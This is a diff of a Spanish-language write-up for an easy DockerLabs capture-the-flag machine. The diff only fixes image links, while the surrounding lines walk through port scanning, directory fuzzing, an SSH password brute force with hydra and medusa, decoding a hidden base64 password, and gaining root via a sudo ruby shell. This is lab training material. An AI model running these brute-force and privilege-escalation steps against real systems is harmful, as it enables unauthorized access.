@@ -13,7 +13,7 @@ Realizamos el primer sondeo a la ip de la victimma para averiguar que puertos es
 nmap --open -p- -n -sS -Pn $ip -oG FirsScan
 ~~~
 
-![Primer_Escaneo](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/Nmap1Scan.png)
+![Primer_Escaneo](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/Nmap1Scan.png?raw=true)
 
 - `--open`: Nos muestre los puertos abiertos.
 - `-p-`: Escanear todo el rango de puertos (65535)
@@ -31,7 +31,7 @@ Realizamos enumaeración a los puertos abiertos.
 nmap -sVC -p 22,80 172.17.0.2 -oN ServicesScan
 ~~~
 
-![Escaneo_Sevicios](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/ServicesScan.png)
+![Escaneo_Sevicios](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/ServicesScan.png?raw=true)
 - `-sC`: Ejecuta scripts NSE (Nmap Scripting Engine) predeterminados.
 - `-sV`: Detecta la versión del servicio que se está ejecutando en cada puerto abierto.
 _____________________________________________________________________________________________________________________________________________________________________
@@ -45,11 +45,11 @@ Vemos el puerto `80` que corresponde a un servicio `http`, veamos que hay en él
 whatweb http://172.17.0.2
 ~~~
 
-![whatweb](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/whatweb.png)
+![whatweb](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/whatweb.png?raw=true)
 
 Abrimos en navegador y vamos a dicha web, leemos y podemos ver algo interesante, una nota de `Carlota`.
 Yo siempre reviso view-source de la web por si se me escapa algo interesante.
-![despido](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/despidoempleado.png)
+![despido](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/despidoempleado.png?raw=true)
 
 _____________________________________________________________________________________________________________________________________________________________________
 
@@ -64,7 +64,7 @@ El siguiente paso será intentar descubrir posibles directorios, podemos usar cu
 wfuzz -c --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 http://172.17.0.2/FUZZ
 ~~~
 
-![wfuzz](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/zfuzz.png)
+![wfuzz](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/zfuzz.png?raw=true)
 
 - `-c`: Formato colorizado
 - `--hc=404`: Ocultar el código de estado 404 (Not Found)
@@ -78,7 +78,7 @@ wfuzz -c --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.
 gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200
 ~~~
 
-![gobuster](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/burp.png)
+![gobuster](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/burp.png?raw=true)
 
 - `dir`: Modo de descubrimiento de directorios y archivos
 - `-u`: Dirección URL
@@ -107,7 +107,7 @@ hydra -l carlota -P /usr/share/wordlists/rockyou.txt -t4 ssh://172.17.0.2
 ~~~ bash
 medusa -h 172.17.0.2 -u carlota -P /usr/share/wordlists/rockyou.txt -M ssh -t 4
 ~~~
-![medusa](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/medusa.png)
+![medusa](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/medusa.png?raw=true)
 
 - `-h`: Especifica la dirección IP del objetivo.
 - `-u`: Especifica el nombre de usuario a probar.
@@ -131,14 +131,14 @@ export TERM=xterm
 
 En primer lugar veremos si tenemos privilegios `sudo` mediante `sudo -l`, pero no hay suerte. Seguimos enumerando y vemos una imagen en una carpeta de Carlota.
 
-![estego](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/estego.png)
+![estego](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/estego.png?raw=true)
 
 Vamos a comprobar si tiene información oculta. En primer lugar nos la descargamos, para ello lo vamos a hacer de dos modos diferentes, es bueno saver varias maneras de hacer las cosas ya que no siempre funcionan los mismos metodos.
 
 ~~~ bash
 scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /opt/amor
 ~~~
-![scp](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/scp.png)
+![scp](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/scp.png?raw=true)
 
 El segundo sería crear un servidor temporal con python y descargarla desde el lado del atacante.
 
@@ -146,12 +146,12 @@ El segundo sería crear un servidor temporal con python y descargarla desde el l
 Victima
 python3 -m http.server 8080
 ~~~
-![httpserver](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/httpserver.png)
+![httpserver](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/httpserver.png?raw=true)
 ~~~
 Atacante
 wget http://172.17.0.2:8080/imagen.jpg
 ~~~
-![wget](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/wget.png)
+![wget](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/wget.png?raw=true)
 
 
 ## Esteganografía y escalada de privilegios
@@ -172,7 +172,7 @@ Decodificamos con un simple comando.
 ~~~
 cat secret.txt | base64 -d
 ~~~
-![decode](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/decode.png)
+![decode](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/decode.png?raw=true)
 
 Probamos la contraseña para escalar a root pero no hay suerte. Revisamos el archivo /etc/passwd para ver los usuarios.
 Observamos tres usuarios activos, oscar, carlota y root.
@@ -180,14 +180,14 @@ Observamos tres usuarios activos, oscar, carlota y root.
 ~~~
 cat /etc/passwd
 ~~~
-![users](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/users.png)
+![users](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/users.png?raw=true)
 
 Probamos con el usuario Oscar y efectivamente funciona.
 ~~~
 su oscar
 whoami
 ~~~
-![whoami](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/oscar.png)
+![changeuser](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/oscar.png?raw=true)
 
 Los siguientes pasos consisten en enumerar al igual que con el usuario Carlota.
 
@@ -195,19 +195,19 @@ Tanto directorios, como permisos  de archivos, rutas. El primer paso es saber si
 ~~~
 sudo -l
 ~~~
-![whoami](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/nopasswd.png)
+![nopassword](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/nopasswd.png?raw=true)
 
 Podemos ver que el usuario Oscar puede ejecutar /usr/bin/ruby como root sin necesidad de contraseña.
 Ahora vamos a averiguar la manera. Vamos a la web gtfobins.github.io, buscamos ruby y seleccionamos sudo.
 Leemos atentamente, en este camos buscamos un shell simplemente.
 
-![whoami](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/ruby.png)
+![ruby](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/ruby.png?raw=true)
 ~~~
 sudo ruby -e 'exec "/bin/sh"'
 whoami
 ~~~
 
-![whoami](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/root.png)
+![root](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/root.png?raw=true)
 
 Pues ya estaría :D
 
